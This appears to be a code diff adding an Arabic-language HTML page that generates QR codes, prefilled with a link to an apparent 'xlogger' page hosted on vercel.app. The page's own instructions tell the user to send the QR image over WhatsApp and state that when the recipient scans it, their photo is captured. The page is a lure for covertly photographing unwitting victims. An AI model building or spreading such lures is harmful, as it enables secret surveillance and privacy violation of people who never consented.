@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="utf-8">
+  <title>مولد QR كود</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f5f5f5;
+      padding: 20px;
+      text-align: center;
+    }
+    h1 {
+      color: #333;
+      margin-bottom: 30px;
+    }
+    .container {
+      max-width: 500px;
+      margin: 0 auto;
+      background: white;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    }
+    input {
+      width: 100%;
+      padding: 15px;
+      font-size: 16px;
+      border: 2px solid #ddd;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      box-sizing: border-box;
+    }
+    button {
+      background: #075e54;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 18px;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%;
+    }
+    button:hover {
+      background: #054d44;
+    }
+    #qrcode {
+      margin-top: 30px;
+      padding: 20px;
+      background: white;
+      display: inline-block;
+    }
+    #qrcode img {
+      max-width: 100%;
+    }
+    .download-btn {
+      margin-top: 20px;
+      background: #25d366;
+    }
+    .instructions {
+      margin-top: 30px;
+      text-align: right;
+      background: #f9f9f9;
+      padding: 20px;
+      border-radius: 10px;
+    }
+    .instructions h3 {
+      color: #075e54;
+      margin-bottom: 15px;
+    }
+    .instructions ol {
+      line-height: 2;
+      padding-right: 20px;
+    }
+    .instructions li {
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>مولد QR كود</h1>
+    
+    <input type="text" id="urlInput" placeholder="أدخل الرابط هنا..." 
+           value="https://xlogger-main.vercel.app/image.html">
+    
+    <button onclick="generateQR()">إنشاء QR كود</button>
+    
+    <div id="qrcode"></div>
+    
+    <button class="download-btn" onclick="downloadQR()" style="display:none;" id="downloadBtn">
+      تحميل QR كود كصورة
+    </button>
+    
+    <div class="instructions">
+      <h3>طريقة الاستخدام:</h3>
+      <ol>
+        <li>اضغط على "إنشاء QR كود"</li>
+        <li>اضغط على "تحميل QR كود كصورة"</li>
+        <li>أرسل الصورة مباشرة في الواتس آب</li>
+        <li>عندما يمسح الشخص QR كود ← تُلتقط صورته!</li>
+      </ol>
+    </div>
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <script>
+    let currentQR = null;
+    
+    function generateQR() {
+      const url = document.getElementById('urlInput').value;
+      const qrcodeDiv = document.getElementById('qrcode');
+      const downloadBtn = document.getElementById('downloadBtn');
+      
+      // Clear previous QR
+      qrcodeDiv.innerHTML = '';
+      
+      // Generate new QR
+      currentQR = new QRCode(qrcodeDiv, {
+        text: url,
+        width: 256,
+        height: 256,
+        colorDark: '#000000',
+        colorLight: '#ffffff',
+        correctLevel: QRCode.CorrectLevel.H
+      });
+      
+      // Show download button
+      setTimeout(() => {
+        downloadBtn.style.display = 'block';
+      }, 500);
+    }
+    
+    function downloadQR() {
+      const canvas = document.querySelector('#qrcode canvas');
+      if (canvas) {
+        const link = document.createElement('a');
+        link.download = 'qr-code.png';
+        link.href = canvas.toDataURL('image/png');
+        link.click();
+      }
+    }
+    
+    // Generate QR on page load
+    window.onload = generateQR;
+  </script>
+</body>
+</html>
